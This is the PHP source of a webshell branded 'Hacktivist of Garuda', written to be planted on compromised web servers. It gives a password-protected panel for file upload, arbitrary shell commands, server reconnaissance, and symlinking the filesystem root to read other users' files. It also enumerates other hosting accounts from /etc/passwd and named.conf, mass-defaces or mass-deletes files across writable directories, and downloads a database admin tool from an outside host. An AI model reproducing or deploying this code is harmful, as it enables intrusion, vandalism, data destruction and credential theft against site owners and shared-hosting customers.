...
?>
<title>LOGIN & Deface</title>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<meta name="bingbot" content="noindex, nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" type="image/png" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbUWAOownjiUi5kmiyGtKqN7P7bAWn_Ppp8MHPdNLfxWe87YW7LwYqIZcZ-7Fdoj16ibMSL-kti9MXKFr45AqRlteFvqWFph9orfOmc928WFAKCS_41INxatuTfBUyupUvvByGXlJ_3cuIzLSyGag00VF-htpC3bmzaTbf12nqRLgD7ZnzzE9JG4_MYw/s512/arrow-button-icon-right-arrow-transparent-background-41d007bc4d6c1d2e72ed6f7ec2cf9997.png">
<style>
  html {
    background: #000000;
    color: #000000;
...
<center>
<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7HlbUFZpFfs3q2kn0iJD4kMKI2zIF9F1hczrmte7Hu02XudvGa6Mr5b-bF_zmUbeFbmbWkg25VdOAaP-rRTq0WQGkmko0sXqikD1pYJ5pZuHF2HbYtJ5ZqQrr2vLwXWMCCpT2jTgUCTjyVnxNcTtd8_-E64SZfIjrlz8S-JqAW5GV3P0AgYPK3uQozQ/s2048/d8ee01f1-1702-4c35-9bc5-80cef0cb83c4_.jpg" width="200" height="200">
<p>
<table height="100%" width="100%">
  <td align="center">
    <br></div>
<div class="glow">
<font color=cyan> Hacktivist of Garuda Webshell</div><br>
    <form enctype="multipart/form-data" method="post">
      <input type="password" name="passwd">
      <input type="submit" name="pass" value="enter">
    </form>
  </td>
</table>
<?php
...
?>
<title>.: Hacktivist of Garuda :.</title>
...
<center>
<hr>
	<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9aq_EBTCMCRF7OzQg0lKNvfGIClFNNTF9MLJhh1gy_bwRPZlxwt8vfheKCZmgSMqgchxp9n-TOAtm9uUnraKUBGah7zgrCKsB1t013_FqDSo3Bpb8zhv7mykFTRpCASDrV8V6kPh98M_Yr4fe1A9Ij-Z9nEfAl3AkCbo0YgEigB126TYCnvIva0jbIA/s1288/IMG_20220710_215757.png" style="width:60px;height:60px;" align="right">
 <font color=#FFFFFF><b><h1>Hacktivist of <font color=#FF4500>Garuda </h1>
<p>
 <a href="https://twitter.com/hacktivistlink?t=y9za0Xb1RoIpwZo1FRVW5g&s=09">Twitter</a><font color=#FF4500> |  <a href="mailto:hacktivistofgaruda.666@gmail.com">Email</a></p>


<hr>
</center>
<b> <font color=#FFFFFF>Wellcome To <font color=#FF4500> Hacktivist of Garuda <font color=#FFFFFF> Webshell <font color=#FFFFFF>..:: <font color=#FFFFFF>Created by px7 <font color=#FFFFFF>::..</b>
<br><br>
	<font color=#00ff00>
<?php
...
echo "SERVER IP > <font color=#FFFFFF>".gethostbyname($_SERVER['HTTP_HOST'])."<br></font>";
echo "KERNEL > <font color=#FFFFFF>".php_uname()."<br></font>";
echo "PERANGKAT LUNAK > <font color=#FFFFFF>".$soft."<br></font>";
echo "SISTEM OPERASI > <font color=#FFFFFF>".$os."<br></font>";
echo "MODE AMAN > <font color=#FFFFFF>".$sm."<br></font>";
echo "FUNGSI MATI > <font color=#FFFFFF>".$show_ds."<br></font>";
echo "PENGGUNA > <font color=#FFFFFF>".$user."</font><font color=#FFFFFF> (".$uid.") </font> KELOMPOK > <font color=#FFFFFF>".$group."</font><font color=#FFFFFF> (".$gid.") </font>
<br>";
?>
<hr>
<?php
function w($dir_raw,$perm) {
	if(!is_writable($dir_raw)) {
		return "<font color=#FFFFFF>".$perm."</font>";
	} else {
		return "<font color=#00ff00>".$perm."</font>";
	}
}
...
?>
<form enctype="multipart/form-data" method="post">
  <input style="border:transparent;" type="file" class="custom-file-input" name="px7">
  <input type="submit" value="enter">
</form>
<?php
if($_FILES['px7']) {
  if(copy($_FILES['px7']['tmp_name'], $_FILES['px7']['name'])) {
    echo "<br>".$_FILES[px7][name]." Berhasil Upload :)";
  } else {
    echo "<br>Gagal Upload ".$_FILES[px7][name].":(";
  }
}
?>
<hr>
...
[ <a href="?mass=true">MASS DEFACE</a> ] 
...
<form enctype="multipart/form-data" method="post">
  Shell@<?php echo $_SERVER['HTTP_HOST'].":".$dir." $ "; ?><input class="cmnd" type="text" name="shell"><input type="submit" value="enter">
</form>
...
if($_GET['folderc'] == "true"){
   if($_POST['new_save_folder']) {
		...
		if(!mkdir($new_folder)) {
			$act = "<font color=#FFFFFF>permission denied</font>";
		} else {
...
elseif($_GET['symlink'] == "true") {
 if(!is_dir("px7_sym")) {
  ...
  if(!symlink("/", "px7_sym/root")) {
      echo "<b>.: SYMLINK :.</b>";
  }
  $hta="Options Indexes FollowSymLinks\nDirectoryIndex defacer\nAddType txt .php\nAddHandler txt .php\n";
  $htaccess=fopen("px7_sym/.htaccess", "w");
  fwrite($htaccess, $hta);
  fclose($htaccess);
  echo "<b></b><br><br>";
  ...
  foreach($lined as $line_x) {
    ...
    echo "<tr><td>$user_x[0]</td><td><font color='#FF4500'><a href='px7_sym/root/home/$user_x[0]'>Symlink</a></font></td>";
  }
  echo "</table>";
}
elseif($_GET["jump"] == "true"){
   $i = 0;
	...
	if(preg_match("/hsphere/", $dir)) {
				...
				while($gets = fgets($f)) {
					...
					if(is_dir($dir_user) === true) {
						...
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=#00ff00>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=#00ff00>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
			...
			foreach($urls as $url) {
				...
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=#00ff00>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=#00ff00>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
		...
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=#FFFFFF>tidak bisa membaca /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=#FFFFFF>Tidak bisa di baca  /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_px7_jump) {
					$user_jumping_dir = "/home/$user_px7_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=#00ff00>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=#00ff00>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=#FFFFFF>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_px7_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
...
<font size=4><center>
<form action="#" method="post"> 	 <input type="email" name="email" placeholder="email" /> 	 <input type="submit" name="submit" value="enter"/> 	 
</form> 	 	 
<br/><br/><br/> 
</p>'; ?> 
<?php 
...
elseif($_GET["mass"] == "true"){
   echo "<center><form action=\"\" method=\"post\">\n";
	...
	function edit_file($file,$index){
		...
		echo "<Span style='color:green;'><strong> [+] Oke Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:#FFFFFF;'><strong> [-] Kyahh gak vuln </strong></span><br></center>";
			}
			}
					...
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								...
								unlink($lokasi);
								$px7 = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
	...
	function depes_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				...
				if($dirb === '.') {
					...
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							...
							file_put_contents($lokasi, $isi_script);
							$px7 = depes_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
	...
	elseif($_POST['mass'] == 'depeskabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'depesmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		depes_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		...
		<option value=\"depeskabeh\">depes Massal Di Tempat</option>
		<option value=\"depesmematikan\">depes Massal Bunuh Diri</option>
...
elseif($_GET["adminer"] == "true"){
   $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	...
	if(file_exists('adminer.txt')) {
		echo "<center><font color=#00ff00><a href='$full/adminer.php' target='_blank'>.: ADMINER LOGIN :.</a></font></center>";
	} else {
		if(adminer("https://www.bijnesbhai.com/css/adminer.txt","adminer.php")) {
			echo "<center><font color=#00ff00><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=#FFFFFF>gagal buat file adminer</font></center>";
		}
	}
}
...
<input style="color:#2EFF2E;background-color:#000000" name="conf" type="submit" size="10" value="enter">
<br/><br/></form>';
if ($_POST['conf']) {
$home = $_POST['home'];
$folfig = $home;
...
?>
<hr><font color=#FFFFFF>hacktivistofgaruda.666@gmail.com</hr><br>
		<iframe allow="autoplay" allowfullscreen="" frameborder="0" height="0" src="https://d.top4top.io/m_16452u8cv0.mp3"></iframe>
</center>   